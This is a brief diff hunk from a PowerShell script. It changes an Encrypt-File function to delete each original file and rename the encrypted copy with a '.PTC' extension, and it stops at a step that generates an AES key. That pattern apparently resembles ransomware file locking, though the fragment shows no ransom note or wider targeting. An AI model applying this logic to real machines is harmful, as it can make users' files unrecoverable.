@@ -49,9 +49,9 @@ function Encrypt-File {
         $outputStream.Close()
     }
 
-    # Replace original file with the encrypted one
+    # Remove the original file and rename the encrypted file
     Remove-Item -Path $filePath
-    Rename-Item -Path $tempFilePath -NewName $filePath
+    Rename-Item -Path $tempFilePath -NewName ($filePath + ".PTC")
 }
 
 # Generate AES key and IV
